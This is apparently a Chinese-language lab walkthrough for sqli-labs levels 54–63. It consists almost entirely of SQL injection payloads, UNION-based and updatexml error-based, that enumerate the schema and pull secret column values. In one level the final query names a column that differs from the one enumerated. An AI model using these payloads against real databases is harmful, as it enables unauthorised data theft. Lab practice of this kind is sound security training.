### 第五十四关
联合注入十次尝试机会
?id=1' -- qwe
?id=1' order by 3 -- qwe
?id=-1' union select 1,2,3 -- qwe
?id=-1' union select 1,database(),3 -- qwe
	数据库名：challenges
?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()-- qwe
	表名：kx8wkxia2m
?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name='kx8wkxia2m'-- qwe
	列名：id,sessid,secret_ZCVX,tryy
?id=-1' union select 1,group_concat('%',id,'%',secret_NVP3),3 from challenges.kx8wkxia2m -- qwe
### 第五十五关
与五十四关差不多，关闭了报错回显所以使用联合注入
?id=1) -- qwe
?id=1) order by 3 -- qwe
?id=-1) union select 1,2,3 -- qwe
?id=-1) union select 1,database(),3 -- qwe
	数据库名：challenges
?id=-1) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()-- qwe
	表名：3lvh635yob
?id=-1) union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name='3lvh635yob'-- qwe
	列名：id,sessid,secret_1EU2,tryy
?id=-1) union select 1,group_concat('%',id,'%',secret_1EU2),3 from challenges.3lvh635yob -- qwe
### 第五十六关
依旧是换回显关闭报错
?id=1') -- qwe
?id=1') order by 3 -- qwe
?id=-1') union select 1,2,3 -- qwe
?id=-1') union select 1,database(),3 -- qwe
	数据库名：challenges
?id=-1') union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()-- qwe
	表名：ig9u2iad33
?id=-1') union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name='ig9u2iad33'-- qwe
	列名：id,sessid,secret_2RJK,tryy
?id=-1') union select 1,group_concat('%',id,'%',secret_2RJK),3 from challenges.ig9u2iad33 -- qwe
### 第五十七关
双引号闭合
?id=1" -- qwe
?id=1" order by 3 -- qwe
?id=-1" union select 1,2,3 -- qwe
?id=-1" union select 1,database(),3 -- qwe
	数据库名：challenges
?id=-1" union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()-- qwe
	表名：9pk7bqbdkr
?id=-1" union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name='9pk7bqbdkr'-- qwe
	列名：id,sessid,secret_I5FL,tryy
?id=-1" union select 1,group_concat('%',id,'%',secret_I5FL),3 from challenges.9pk7bqbdkr -- qwe
### 第五十八关
?id=1' and updatexml(1,concat('%',database()),1) -- qwe
?id=1' and updatexml(1,(select group_concat('%',table_name) from information_schema.tables where table_schema=database() ),1) -- qwe
	3yjh9fmtof
?id=1' and updatexml(1,(select group_concat('%',column_name) from information_schema.columns where table_schema=database() and table_name='3yjh9fmtof' ),1) -- qwe
	secret_XAXT
?id=1' and updatexml(1, (select group_concat('%',secret_XAXT) from challenges.3yjh9fmtof) ,1) -- qwe
### 第五十九关
?id=1 and updatexml(1,concat('%',database()),1) -- qwe
?id=1 and updatexml(1,(select group_concat('%',table_name) from information_schema.tables where table_schema=database() ),1) -- qwe
	crdwedyz56
?id=1 and updatexml(1,(select group_concat('%',column_name) from information_schema.columns where table_schema=database() and table_name='crdwedyz56' ),1) -- qwe
	secret_P0GD
?id=1 and updatexml(1, (select group_concat('%',secret_P0GD) from challenges.crdwedyz56) ,1) -- qwe
### 第六十关
?id=1'") and updatexml(1,concat('%',database()),1) -- qwe
?id=1'") and updatexml(1,(select group_concat('%',table_name) from information_schema.tables where table_schema=database() ),1) -- qwe
	szc1e04xny
?id=1'") and updatexml(1,(select group_concat('%',column_name) from information_schema.columns where table_schema=database() and table_name='szc1e04xny' ),1) -- qwe
	secret_55MX
?id=1'") and updatexml(1, (select group_concat('%',secret_55MX) from challenges.szc1e04xny) ,1) -- qwe
### 第六十一关
?id=1')) and updatexml(1,concat('%',database()),1) -- qwe
?id=1')) and updatexml(1,(select group_concat('%',table_name) from information_schema.tables where table_schema=database() ),1) -- qwe
	0chk77od8a
?id=1')) and updatexml(1,(select group_concat('%',column_name) from information_schema.columns where table_schema=database() and table_name='0chk77od8a' ),1) -- qwe
	secret_6A9N
?id=1')) and updatexml(1, (select group_concat('%',secret_6A9N) from challenges.0chk77od8a) ,1) -- qwe

### 第六十二关至六十三关时间盲注即可

